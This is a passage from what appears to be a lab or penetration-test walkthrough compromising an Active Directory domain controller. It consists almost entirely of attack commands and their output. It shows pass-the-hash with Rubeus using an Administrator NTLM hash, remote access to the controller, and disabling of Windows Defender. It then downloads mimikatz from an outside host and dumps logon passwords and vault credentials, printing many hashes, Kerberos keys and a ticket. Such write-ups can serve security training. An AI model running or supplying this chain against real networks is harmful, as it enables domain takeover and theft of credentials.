    lm  - 0: 9d3b595e9f07f553d9694d4b229073c8

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 0a74f30b64ebc18c5e59cc00d204aa8e

* Primary:Kerberos-Newer-Keys *
    Default Salt : GCBHR.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 2a6e0e711030282fe4bcaa95d1f40ef248ddd14dabf2d0d8bdd404544c48ea18
      aes128_hmac       (4096) : 0042bc72dda070f71bcc7bd92c9a140e
      des_cbc_md5       (4096) : dca2f801455b8cfb
    OldCredentials
      aes256_hmac       (4096) : ddc747038aa3e852b0b6730e2b157fc24a1349ed2d971125da642f4b66975884
      aes128_hmac       (4096) : ea1ed862e1b177756550bfb43fd922b1
      des_cbc_md5       (4096) : b09268df1379f2ba
    OlderCredentials
      aes256_hmac       (4096) : 6ee5d99e81fd6bdd2908243ef1111736132f4b107822e4eebf23a18ded385e61
      aes128_hmac       (4096) : 6508ee108b9737e83f289d79ea365151
      des_cbc_md5       (4096) : 31435d975783d0d0

* Primary:Kerberos *
    Default Salt : GCBHR.LOCALAdministrator
    Credentials
      des_cbc_md5       : dca2f801455b8cfb
    OldCredentials
      des_cbc_md5       : b09268df1379f2ba

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  8d852dd8eb9576b73c58e4a301ff05c2
    02  fb1dfaebf3d3780bdfa90401156ce55b
    03  c6d61dc0542828449a160659d856fa46
    04  8d852dd8eb9576b73c58e4a301ff05c2
    05  19a7528378fbdda5412c1c07a5fc5fdd
    06  26f7835fa3e4468c6c7938aeaa39d457
    07  2f46403349ab4d7622cba4edb1383e50
    08  437647c21f84805e65821751cb44aa61
    09  b360afc0bccf7249ef88a71c04dc365c
    10  232f64f54ad00dced5182e92d5d79844
    11  c4c4f366df68fb8aa85d2828b7bf93cc
    12  437647c21f84805e65821751cb44aa61
    13  b66d8b2ac810e715be002f71274419aa
    14  98d82d814d7aa210c4aef34d7ee7882b
    15  a330f073719d6afaf9500f973f6de8b2
    16  cb1069324c9b946c6f1c39e105f87805
    17  1f420d496756044f933e67738c745fb8
    18  5a3feff4f8f29b0e9a68995baead5e81
    19  fbd336fb38bb49d0da7a128119055a22
    20  aefd8970d037c1816f1ab29f96651eaa
    21  d5b0560f73b5bc7ce00b4d7174268cac
    22  31012ab958988756715bd878466bcb33
    23  d9a29c198c2352375182a4569fc395b4
    24  74d7d82351fdcecaae768ffc60bca948
    25  faa2961f12e82ae2a88f0406b1533233
    26  b66d2fac56686a6c18db71fb0af48859
    27  1f3319cd9472672b090812c6e320344a
    28  9e786d86c26f0a5389d9b4bb27a21bf5
    29  3bf69c68f3f9945375d9229c53ad3cc4


mimikatz(commandline) # exit
Bye!
```


### 4. Impersonate domain Admin And Access to hr-dc02.gcbhr.local

```
PS C:\> .\Rubeus.exe asktgt /domain:gcbhr.local /user:Administrator /ntlm:8ac67fcb8e19ab697a6f74f7d83436c4 /ptt
.\Rubeus.exe asktgt /domain:gcbhr.local /user:Administrator /ntlm:8ac67fcb8e19ab697a6f74f7d83436c4 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 8ac67fcb8e19ab697a6f74f7d83436c4
[*] Building AS-REQ (w/ preauth) for: 'gcbhr.local\Administrator'
[*] Using domain controller: 192.168.43.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/gcbhr.local
  ServiceRealm             :  GCBHR.LOCAL
  UserName                 :  Administrator
  UserRealm                :  GCBHR.LOCAL
  StartTime                :  7/25/2024 2:16:57 AM
  EndTime                  :  7/25/2024 12:16:57 PM
  RenewTill                :  8/1/2024 2:16:57 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Qgwe9zNlBzJjDoPNHsMu6A==
  ASREP (key)              :  8AC67FCB8E19AB697A6F74F7D83436C4

PS C:\> klist
klist

Current LogonId is 0:0x3e7

Cached Tickets: (1)

#0>     Client: Administrator @ GCBHR.LOCAL
        Server: krbtgt/gcbhr.local @ GCBHR.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 7/25/2024 2:16:57 (local)
        End Time:   7/25/2024 12:16:57 (local)
        Renew Time: 8/1/2024 2:16:57 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```
Access to hr-dc02.gcbhr.local:
```
PS C:\> Enter-PSSession -ComputerName hr-dc02.gcbhr.local
Enter-PSSession -ComputerName hr-dc02.gcbhr.local
[hr-dc02.gcbhr.local]: PS C:\Users\Administrator\Documents> whoami
whoami
hr\administrator
[hr-dc02.gcbhr.local]: PS C:\Users\Administrator\Documents> hostname
hostname
hr-dc02
[hr-dc02.gcbhr.local]: PS C:\Users\Administrator\Documents> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::3b9:738f:322a:c967%14
   IPv4 Address. . . . . . . . . . . : 192.168.43.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.43.254
```
### 5. Disable AV and extract domain hashes

```
[hr-dc02.gcbhr.local]: PS C:\Users\Administrator\Documents> powershell -c Set-MpPreference -DisableRealTimeMonitoring 1
powershell -c Set-MpPreference -DisableRealTimeMonitoring 1
[hr-dc02.gcbhr.local]: PS C:\Users\Administrator\Documents> powershell -c wget http://192.168.100.15/mimikatz.exe -OutFile C:\mimikatz.exe
powershell -c wget http://192.168.100.15/mimikatz.exe -OutFile C:\mimikatz.exe
```

```
[hr-dc02.gcbhr.local]: PS C:\Users\Administrator\Documents> powershell -c C:\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"
powershell -c C:\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

660     {0;000003e7} 1 D 22648          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0282b0de} 0 D 42565106    HR\Administrator        S-1-5-21-3602425948-896546556-3985009324-500   (16g,26p)                         Primary
 * Thread Token  : {0;000003e7} 1 D 42679628    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 2556130 (00000000:002700e2)
Session           : RemoteInteractive from 2
User Name         : administrator
Domain            : HR
Logon Server      : HR-DC02
Logon Time        : 4/29/2024 12:11:15 AM
SID               : S-1-5-21-3602425948-896546556-3985009324-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : HR
         * NTLM     : 8ac67fcb8e19ab697a6f74f7d83436c4
         * SHA1     : 60d1341163be3543b4fc5ecbc3b96ad52dfc3841
         * DPAPI    : 5b564a09761c0844da54a30f7259a8dd
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : administrator
         * Domain   : GCBHR.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 31757 (00000000:00007c0d)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:59 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : HR-DC02$
         * Domain   : HR
         * NTLM     : a70a37d26899db908b0f714be869a0ad
         * SHA1     : 3ab5d6cb344752f5e2c1ddf7d21bffb6d9a55eef
         * DPAPI    : 3ab5d6cb344752f5e2c1ddf7d21bffb6
        tspkg :
        wdigest :
         * Username : HR-DC02$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-DC02$
         * Domain   : gcbhr.local
         * Password : e9 79 f5 9e 94 9d 7e 65 9b f0 1b ec c2 a8 9c ed ea 31 5d ff c4 86 92 e6 2c bc f3 be 24 83 59 ef b2 52 1e f2 21 71 8c 13 ac f2 9e ed 8c 5c 41 0f e5 3c 18 5d b1 54 da 97 9e 33 cd 21 0e de 93 04 f4 1f 15 29 96 6e f4 bf 33 b7 bd cf 60 55 b5 d1 ea 31 2f 5c ac a2 10 8a 75 8c 21 a4 b0 d2 5a 7d c6 af d5 6b 20 11 bd a0 3a 11 a1 61 a2 2f 49 1a 07 9a 62 e4 aa 20 d9 ed 26 5c b3 6f 04 8f c6 a9 da 92 cf 4d 11 54 94 02 5f 50 a2 e7 af e0 66 58 9f 5a 16 c8 ac 3f 99 4e 31 c4 79 3d c2 4e b1 b1 91 32 ee 28 a7 8f 84 49 63 61 17 ee 56 30 41 39 33 04 b4 28 ec 06 66 a8 28 e8 dc a9 49 0c 90 2f 62 13 17 ad 48 1a 75 d7 6e a9 2f b5 08 b8 20 4f dd 4a 03 9f c3 f3 12 65 83 81 14 89 d6 9b e9 c3 a0 de 6d 61 98 ae 2d 56 80 29 e3 93 17 4e 97 93
        ssp :
        credman :

Authentication Id : 0 ; 31730 (00000000:00007bf2)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:59 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : HR-DC02$
         * Domain   : HR
         * NTLM     : a70a37d26899db908b0f714be869a0ad
         * SHA1     : 3ab5d6cb344752f5e2c1ddf7d21bffb6d9a55eef
         * DPAPI    : 3ab5d6cb344752f5e2c1ddf7d21bffb6
        tspkg :
        wdigest :
         * Username : HR-DC02$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-DC02$
         * Domain   : gcbhr.local
         * Password : e9 79 f5 9e 94 9d 7e 65 9b f0 1b ec c2 a8 9c ed ea 31 5d ff c4 86 92 e6 2c bc f3 be 24 83 59 ef b2 52 1e f2 21 71 8c 13 ac f2 9e ed 8c 5c 41 0f e5 3c 18 5d b1 54 da 97 9e 33 cd 21 0e de 93 04 f4 1f 15 29 96 6e f4 bf 33 b7 bd cf 60 55 b5 d1 ea 31 2f 5c ac a2 10 8a 75 8c 21 a4 b0 d2 5a 7d c6 af d5 6b 20 11 bd a0 3a 11 a1 61 a2 2f 49 1a 07 9a 62 e4 aa 20 d9 ed 26 5c b3 6f 04 8f c6 a9 da 92 cf 4d 11 54 94 02 5f 50 a2 e7 af e0 66 58 9f 5a 16 c8 ac 3f 99 4e 31 c4 79 3d c2 4e b1 b1 91 32 ee 28 a7 8f 84 49 63 61 17 ee 56 30 41 39 33 04 b4 28 ec 06 66 a8 28 e8 dc a9 49 0c 90 2f 62 13 17 ad 48 1a 75 d7 6e a9 2f b5 08 b8 20 4f dd 4a 03 9f c3 f3 12 65 83 81 14 89 d6 9b e9 c3 a0 de 6d 61 98 ae 2d 56 80 29 e3 93 17 4e 97 93
        ssp :
        credman :

Authentication Id : 0 ; 27805 (00000000:00006c9d)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:54 PM
SID               :
        msv :
         [00000003] Primary
         * Username : HR-DC02$
         * Domain   : HR
         * NTLM     : a70a37d26899db908b0f714be869a0ad
         * SHA1     : 3ab5d6cb344752f5e2c1ddf7d21bffb6d9a55eef
         * DPAPI    : 3ab5d6cb344752f5e2c1ddf7d21bffb6
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 2496855 (00000000:00261957)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/29/2024 12:10:39 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : HR-DC02$
         * Domain   : HR
         * NTLM     : a70a37d26899db908b0f714be869a0ad
         * SHA1     : 3ab5d6cb344752f5e2c1ddf7d21bffb6d9a55eef
         * DPAPI    : 3ab5d6cb344752f5e2c1ddf7d21bffb6
        tspkg :
        wdigest :
         * Username : HR-DC02$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-DC02$
         * Domain   : gcbhr.local
         * Password : e9 79 f5 9e 94 9d 7e 65 9b f0 1b ec c2 a8 9c ed ea 31 5d ff c4 86 92 e6 2c bc f3 be 24 83 59 ef b2 52 1e f2 21 71 8c 13 ac f2 9e ed 8c 5c 41 0f e5 3c 18 5d b1 54 da 97 9e 33 cd 21 0e de 93 04 f4 1f 15 29 96 6e f4 bf 33 b7 bd cf 60 55 b5 d1 ea 31 2f 5c ac a2 10 8a 75 8c 21 a4 b0 d2 5a 7d c6 af d5 6b 20 11 bd a0 3a 11 a1 61 a2 2f 49 1a 07 9a 62 e4 aa 20 d9 ed 26 5c b3 6f 04 8f c6 a9 da 92 cf 4d 11 54 94 02 5f 50 a2 e7 af e0 66 58 9f 5a 16 c8 ac 3f 99 4e 31 c4 79 3d c2 4e b1 b1 91 32 ee 28 a7 8f 84 49 63 61 17 ee 56 30 41 39 33 04 b4 28 ec 06 66 a8 28 e8 dc a9 49 0c 90 2f 62 13 17 ad 48 1a 75 d7 6e a9 2f b5 08 b8 20 4f dd 4a 03 9f c3 f3 12 65 83 81 14 89 d6 9b e9 c3 a0 de 6d 61 98 ae 2d 56 80 29 e3 93 17 4e 97 93
        ssp :
        credman :

Authentication Id : 0 ; 49585 (00000000:0000c1b1)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:00 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : HR-DC02$
         * Domain   : HR
         * NTLM     : a70a37d26899db908b0f714be869a0ad
         * SHA1     : 3ab5d6cb344752f5e2c1ddf7d21bffb6d9a55eef
         * DPAPI    : 3ab5d6cb344752f5e2c1ddf7d21bffb6
        tspkg :
        wdigest :
         * Username : HR-DC02$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-DC02$
         * Domain   : gcbhr.local
         * Password : e9 79 f5 9e 94 9d 7e 65 9b f0 1b ec c2 a8 9c ed ea 31 5d ff c4 86 92 e6 2c bc f3 be 24 83 59 ef b2 52 1e f2 21 71 8c 13 ac f2 9e ed 8c 5c 41 0f e5 3c 18 5d b1 54 da 97 9e 33 cd 21 0e de 93 04 f4 1f 15 29 96 6e f4 bf 33 b7 bd cf 60 55 b5 d1 ea 31 2f 5c ac a2 10 8a 75 8c 21 a4 b0 d2 5a 7d c6 af d5 6b 20 11 bd a0 3a 11 a1 61 a2 2f 49 1a 07 9a 62 e4 aa 20 d9 ed 26 5c b3 6f 04 8f c6 a9 da 92 cf 4d 11 54 94 02 5f 50 a2 e7 af e0 66 58 9f 5a 16 c8 ac 3f 99 4e 31 c4 79 3d c2 4e b1 b1 91 32 ee 28 a7 8f 84 49 63 61 17 ee 56 30 41 39 33 04 b4 28 ec 06 66 a8 28 e8 dc a9 49 0c 90 2f 62 13 17 ad 48 1a 75 d7 6e a9 2f b5 08 b8 20 4f dd 4a 03 9f c3 f3 12 65 83 81 14 89 d6 9b e9 c3 a0 de 6d 61 98 ae 2d 56 80 29 e3 93 17 4e 97 93
        ssp :
        credman :

Authentication Id : 0 ; 31707 (00000000:00007bdb)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:59 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : HR-DC02$
         * Domain   : HR
         * NTLM     : a70a37d26899db908b0f714be869a0ad
         * SHA1     : 3ab5d6cb344752f5e2c1ddf7d21bffb6d9a55eef
         * DPAPI    : 3ab5d6cb344752f5e2c1ddf7d21bffb6
        tspkg :
        wdigest :
         * Username : HR-DC02$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-DC02$
         * Domain   : gcbhr.local
         * Password : e9 79 f5 9e 94 9d 7e 65 9b f0 1b ec c2 a8 9c ed ea 31 5d ff c4 86 92 e6 2c bc f3 be 24 83 59 ef b2 52 1e f2 21 71 8c 13 ac f2 9e ed 8c 5c 41 0f e5 3c 18 5d b1 54 da 97 9e 33 cd 21 0e de 93 04 f4 1f 15 29 96 6e f4 bf 33 b7 bd cf 60 55 b5 d1 ea 31 2f 5c ac a2 10 8a 75 8c 21 a4 b0 d2 5a 7d c6 af d5 6b 20 11 bd a0 3a 11 a1 61 a2 2f 49 1a 07 9a 62 e4 aa 20 d9 ed 26 5c b3 6f 04 8f c6 a9 da 92 cf 4d 11 54 94 02 5f 50 a2 e7 af e0 66 58 9f 5a 16 c8 ac 3f 99 4e 31 c4 79 3d c2 4e b1 b1 91 32 ee 28 a7 8f 84 49 63 61 17 ee 56 30 41 39 33 04 b4 28 ec 06 66 a8 28 e8 dc a9 49 0c 90 2f 62 13 17 ad 48 1a 75 d7 6e a9 2f b5 08 b8 20 4f dd 4a 03 9f c3 f3 12 65 83 81 14 89 d6 9b e9 c3 a0 de 6d 61 98 ae 2d 56 80 29 e3 93 17 4e 97 93
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : HR-DC02$
Domain            : HR
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:54 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : HR-DC02$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : hr-dc02$
         * Domain   : GCBHR.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2496792 (00000000:00261918)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/29/2024 12:10:39 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : HR-DC02$
         * Domain   : HR
         * NTLM     : a70a37d26899db908b0f714be869a0ad
         * SHA1     : 3ab5d6cb344752f5e2c1ddf7d21bffb6d9a55eef
         * DPAPI    : 3ab5d6cb344752f5e2c1ddf7d21bffb6
        tspkg :
        wdigest :
         * Username : HR-DC02$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-DC02$
         * Domain   : gcbhr.local
         * Password : e9 79 f5 9e 94 9d 7e 65 9b f0 1b ec c2 a8 9c ed ea 31 5d ff c4 86 92 e6 2c bc f3 be 24 83 59 ef b2 52 1e f2 21 71 8c 13 ac f2 9e ed 8c 5c 41 0f e5 3c 18 5d b1 54 da 97 9e 33 cd 21 0e de 93 04 f4 1f 15 29 96 6e f4 bf 33 b7 bd cf 60 55 b5 d1 ea 31 2f 5c ac a2 10 8a 75 8c 21 a4 b0 d2 5a 7d c6 af d5 6b 20 11 bd a0 3a 11 a1 61 a2 2f 49 1a 07 9a 62 e4 aa 20 d9 ed 26 5c b3 6f 04 8f c6 a9 da 92 cf 4d 11 54 94 02 5f 50 a2 e7 af e0 66 58 9f 5a 16 c8 ac 3f 99 4e 31 c4 79 3d c2 4e b1 b1 91 32 ee 28 a7 8f 84 49 63 61 17 ee 56 30 41 39 33 04 b4 28 ec 06 66 a8 28 e8 dc a9 49 0c 90 2f 62 13 17 ad 48 1a 75 d7 6e a9 2f b5 08 b8 20 4f dd 4a 03 9f c3 f3 12 65 83 81 14 89 d6 9b e9 c3 a0 de 6d 61 98 ae 2d 56 80 29 e3 93 17 4e 97 93
        ssp :
        credman :

Authentication Id : 0 ; 49610 (00000000:0000c1ca)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:00 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : HR-DC02$
         * Domain   : HR
         * NTLM     : a70a37d26899db908b0f714be869a0ad
         * SHA1     : 3ab5d6cb344752f5e2c1ddf7d21bffb6d9a55eef
         * DPAPI    : 3ab5d6cb344752f5e2c1ddf7d21bffb6
        tspkg :
        wdigest :
         * Username : HR-DC02$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-DC02$
         * Domain   : gcbhr.local
         * Password : e9 79 f5 9e 94 9d 7e 65 9b f0 1b ec c2 a8 9c ed ea 31 5d ff c4 86 92 e6 2c bc f3 be 24 83 59 ef b2 52 1e f2 21 71 8c 13 ac f2 9e ed 8c 5c 41 0f e5 3c 18 5d b1 54 da 97 9e 33 cd 21 0e de 93 04 f4 1f 15 29 96 6e f4 bf 33 b7 bd cf 60 55 b5 d1 ea 31 2f 5c ac a2 10 8a 75 8c 21 a4 b0 d2 5a 7d c6 af d5 6b 20 11 bd a0 3a 11 a1 61 a2 2f 49 1a 07 9a 62 e4 aa 20 d9 ed 26 5c b3 6f 04 8f c6 a9 da 92 cf 4d 11 54 94 02 5f 50 a2 e7 af e0 66 58 9f 5a 16 c8 ac 3f 99 4e 31 c4 79 3d c2 4e b1 b1 91 32 ee 28 a7 8f 84 49 63 61 17 ee 56 30 41 39 33 04 b4 28 ec 06 66 a8 28 e8 dc a9 49 0c 90 2f 62 13 17 ad 48 1a 75 d7 6e a9 2f b5 08 b8 20 4f dd 4a 03 9f c3 f3 12 65 83 81 14 89 d6 9b e9 c3 a0 de 6d 61 98 ae 2d 56 80 29 e3 93 17 4e 97 93
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : HR-DC02$
Domain            : HR
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:59 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : HR-DC02$
         * Domain   : HR
         * NTLM     : a70a37d26899db908b0f714be869a0ad
         * SHA1     : 3ab5d6cb344752f5e2c1ddf7d21bffb6d9a55eef
         * DPAPI    : 3ab5d6cb344752f5e2c1ddf7d21bffb6
        tspkg :
        wdigest :
         * Username : HR-DC02$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : hr-dc02$
         * Domain   : GCBHR.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 31747 (00000000:00007c03)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:59 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : HR-DC02$
         * Domain   : HR
         * NTLM     : a70a37d26899db908b0f714be869a0ad
         * SHA1     : 3ab5d6cb344752f5e2c1ddf7d21bffb6d9a55eef
         * DPAPI    : 3ab5d6cb344752f5e2c1ddf7d21bffb6
        tspkg :
        wdigest :
         * Username : HR-DC02$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-DC02$
         * Domain   : gcbhr.local
         * Password : e9 79 f5 9e 94 9d 7e 65 9b f0 1b ec c2 a8 9c ed ea 31 5d ff c4 86 92 e6 2c bc f3 be 24 83 59 ef b2 52 1e f2 21 71 8c 13 ac f2 9e ed 8c 5c 41 0f e5 3c 18 5d b1 54 da 97 9e 33 cd 21 0e de 93 04 f4 1f 15 29 96 6e f4 bf 33 b7 bd cf 60 55 b5 d1 ea 31 2f 5c ac a2 10 8a 75 8c 21 a4 b0 d2 5a 7d c6 af d5 6b 20 11 bd a0 3a 11 a1 61 a2 2f 49 1a 07 9a 62 e4 aa 20 d9 ed 26 5c b3 6f 04 8f c6 a9 da 92 cf 4d 11 54 94 02 5f 50 a2 e7 af e0 66 58 9f 5a 16 c8 ac 3f 99 4e 31 c4 79 3d c2 4e b1 b1 91 32 ee 28 a7 8f 84 49 63 61 17 ee 56 30 41 39 33 04 b4 28 ec 06 66 a8 28 e8 dc a9 49 0c 90 2f 62 13 17 ad 48 1a 75 d7 6e a9 2f b5 08 b8 20 4f dd 4a 03 9f c3 f3 12 65 83 81 14 89 d6 9b e9 c3 a0 de 6d 61 98 ae 2d 56 80 29 e3 93 17 4e 97 93
        ssp :
        credman :

Authentication Id : 0 ; 2500104 (00000000:00262608)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/29/2024 12:10:39 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : HR-DC02$
         * Domain   : HR
         * NTLM     : a70a37d26899db908b0f714be869a0ad
         * SHA1     : 3ab5d6cb344752f5e2c1ddf7d21bffb6d9a55eef
         * DPAPI    : 3ab5d6cb344752f5e2c1ddf7d21bffb6
        tspkg :
        wdigest :
         * Username : HR-DC02$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-DC02$
         * Domain   : gcbhr.local
